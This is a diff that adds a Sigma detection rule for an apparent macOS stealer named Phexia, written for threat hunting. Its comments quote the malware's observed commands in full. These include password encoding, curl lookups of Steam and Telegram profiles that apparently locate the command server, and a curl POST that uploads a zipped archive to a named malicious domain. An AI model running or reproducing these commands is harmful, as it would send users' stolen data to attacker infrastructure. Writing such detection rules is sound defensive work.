@@ -1,0 +1,63 @@
+title: macOS Phexia Stealer CommandLine Activity
+description: Detects notable command line activity associated with the Phexia macOS stealer.
+status: experimental
+author: IzzyBoop
+date: 2025/12/26
+logsource:
+  product: macos
+  category: process_creation
+detection:
+  # selection_1: 
+  # # selection 1 and 2 capture: sh -c printf %s 'password' | iconv -f UTF-8 -t UTF-8 | base64
+  #   CommandLine|contains|all: 
+  #     - 'sh -c'
+  #     - 'printf %s'
+  #     - 'password'
+  # selection_2: 
+  #   CommandLine|contains|all: 
+  #     - 'iconv'
+  #     - '-f UTF-8'
+  #     - '-t UTF-8'
+  # Selection 1 and 2 split off into their own rule due to too many legitimate processes being captured.
+  selection_3: 
+  # selection 3, 4, and 5 capture: sh -c curl -s https://steamcommunity.com/id/phefuckxia | sed -n 's/.*<span class=\"actual_persona_name\">\([^<]*\)<\/span>.*/\1/p'
+    CommandLine|contains|all:
+      - 'curl -s'
+      - 'steamcommunity'
+      - 'phefuckxia'
+  selection_4: 
+  # General name string match, these should be high value
+    CommandLine|contains:
+      - 'phefuckxia'
+      - 'phefuckxiabot'
+  selection_5: 
+  # piped from selection 3
+    CommandLine|contains|all:
+      - 'sed -n'
+      - 'actual_persona_name'
+  selection_6: 
+  # selection 4 and 6 capture: sh -c curl -s https://t.me/phefuckxiabot | sed -n 's/.*<span dir="auto">\([^<]*\)<\/span>.*/\1/p'
+    CommandLine|contains|all:
+      - 'sed -n'
+      - 'span dir="auto"'
+  selection_7: 
+  # captures: sh -c curl -s 'http://pla7ina.cfd/api.php?check=1'
+    CommandLine|contains|all:
+      - 'curl -s'
+      - 'pla7ina'
+      - 'check=1'
+  selection_8: 
+  # captures: curl -X POST -H cl: 0 --max-time 300 --retry 0 --retry-delay 5 -F txd=0155e587ca6580f4ade81667c22e4fa3 -F file=@/tmp/9f9eeb4b5f40c0cad4a043ad13a0edf31764783205.zip http://pla7ina.cfd/upload.php
+    CommandLine|contains|all:
+      - 'curl -X POST'
+      - 'txd='
+      - 'pla7ina'
+  selection_9: 
+  # captures a large system data upload string
+    CommandLine|contains|all:
+      - 'curl -s -X POST'
+      - 'SPDisplaysDataType'
+      - 'SPHardwareDataType'
+      - 'SPSoftwareDataType'
+      - 'pla7ina'
+  condition: 1 of selection_*
